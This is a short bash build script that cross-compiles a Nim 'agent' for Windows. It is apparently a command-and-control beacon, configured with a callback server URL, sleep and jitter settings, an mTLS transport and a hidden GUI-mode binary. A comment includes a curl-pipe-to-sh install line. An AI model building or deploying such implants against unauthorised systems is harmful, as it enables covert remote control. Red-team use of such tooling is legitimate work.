#!/bin/bash
# Build the Nim agent for Windows x64
# Usage: ./build.sh [server_url] [sleep_sec] [output_name]
#
# Requirements:
#   nim >= 2.0 (install via: curl https://nim-lang.org/choosenim/init.sh | sh)
#   x86_64-w64-mingw32-gcc (apt install mingw-w64)
#   winim package (nimble install winim)

set -e

SERVER_URL="${1:-https://10.2.20.200:8443}"
SLEEP_SEC="${2:-60}"
JITTER_PCT="${3:-20}"
OUTPUT="${4:-agent_nim.exe}"
TRANSPORT="${5:-mtls}"

export PATH="$HOME/.nimble/bin:$PATH"

echo "[*] Building Nim agent → $OUTPUT"
echo "    Server:  $SERVER_URL"
echo "    Sleep:   ${SLEEP_SEC}s ±${JITTER_PCT}%"
echo "    Transport: $TRANSPORT"

nim compile \
  --os:windows \
  --cpu:amd64 \
  --cc:gcc \
  --gcc.exe:"x86_64-w64-mingw32-gcc" \
  --gcc.linkerexe:"x86_64-w64-mingw32-gcc" \
  -d:release \
  -d:danger \
  -d:strip \
  --app:gui \
  --opt:size \
  --hints:off \
  --warnings:off \
  -d:serverUrl="$SERVER_URL" \
  -d:sleepSec=$SLEEP_SEC \
  -d:jitterPct=$JITTER_PCT \
  -d:Transport="$TRANSPORT" \
  --out:"$OUTPUT" \
  agent.nim

echo "[+] Built: $OUTPUT ($(du -h $OUTPUT | cut -f1))"
